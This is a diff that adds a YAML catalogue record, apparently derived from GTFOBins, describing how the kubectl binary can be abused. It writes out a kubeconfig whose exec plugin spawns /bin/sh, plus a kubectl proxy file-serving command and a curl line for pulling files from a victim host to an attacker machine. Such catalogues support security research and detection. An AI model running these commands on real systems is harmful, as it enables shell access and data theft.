@@ -1,0 +1,87 @@
+id: gtfobins/kubectl/shell/unprivileged
+type: binary
+platform: linux
+name: kubectl
+phases:
+- execution
+capabilities:
+- shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: "cat >/path/to/temp-file <<EOF\nclusters:\n- cluster:\n    server: https://x\n  name: x\n\
+    contexts:\n- context:\n    cluster: x\n    user: x\n  name: x\ncurrent-context: x\nusers:\n- name:\
+    \ x\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1\n      interactiveMode:\
+    \ Always\n      command: /bin/sh\n      args:\n        - '-c'\n        - '/bin/sh 0<&2 1>&2'\nEOF\n\
+    \nkubectl get pods --kubeconfig=/path/to/temp-file"
+  comment: The shell is spawn multiple times.
+references:
+- https://gtfobins.github.io/gtfobins/kubectl/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        kubectl:
+          functions:
+            shell:
+            - code: "cat >/path/to/temp-file <<EOF\nclusters:\n- cluster:\n    server: https://x\n  name:\
+                \ x\ncontexts:\n- context:\n    cluster: x\n    user: x\n  name: x\ncurrent-context: x\n\
+                users:\n- name: x\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1\n\
+                \      interactiveMode: Always\n      command: /bin/sh\n      args:\n        - '-c'\n\
+                \        - '/bin/sh 0<&2 1>&2'\nEOF\n\nkubectl get pods --kubeconfig=/path/to/temp-file"
+              comment: The shell is spawn multiple times.
+              contexts:
+                sudo: null
+                unprivileged: null
+            upload:
+            - code: kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver:
+                code: curl victim.com:12345/x/path/to/input-file -o /path/to/output-file
+                comment: An HTTP client can be used on the attacker box to receive the data.
+    upstream_url: https://gtfobins.github.io/gtfobins/kubectl/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:077e494d55af57ae851defbfe66579ca435c2025e26422b710b85566e93427ed
